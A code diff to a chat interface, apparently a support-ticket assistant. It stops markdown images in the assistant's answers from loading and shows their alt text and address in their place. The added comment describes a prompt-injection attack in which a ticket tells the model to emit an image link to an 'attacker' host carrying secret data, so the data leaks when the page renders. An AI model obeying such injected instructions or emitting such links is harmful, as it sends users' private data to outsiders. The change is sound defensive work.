@@ -78,10 +78,19 @@ function ChatThread({ tenant, conversationId, onTicketsChanged, history }: ChatP
 
 const Text: TextMessagePartComponent = ({ text }) => <p className="message-text">{text}</p>;
 
+// Images are never loaded. A ticket can tell the model to add ![](https://attacker/?d=<secret data>);
+// the browser would fetch that URL as soon as it renders the answer, sending the data out with no
+// click and no tool call (ticket #6). We show the image's alt text and address instead.
+const BlockedImage = ({ alt, src }: { alt?: string; src?: string }) => (
+  <span className="blocked-image">
+    [image not loaded: {alt || "no description"}, {src}]
+  </span>
+);
+
 // The assistant's answers as markdown (GitHub flavour: tables, lists, ...). Raw HTML in the text is
 // not rendered, so HTML copied from a ticket into an answer can't inject anything into the page.
 const MarkdownText: TextMessagePartComponent = () => (
-  <MarkdownTextPrimitive className="markdown" remarkPlugins={[remarkGfm]} />
+  <MarkdownTextPrimitive className="markdown" remarkPlugins={[remarkGfm]} components={{ img: BlockedImage }} />
 );
 
 function UserMessage() {
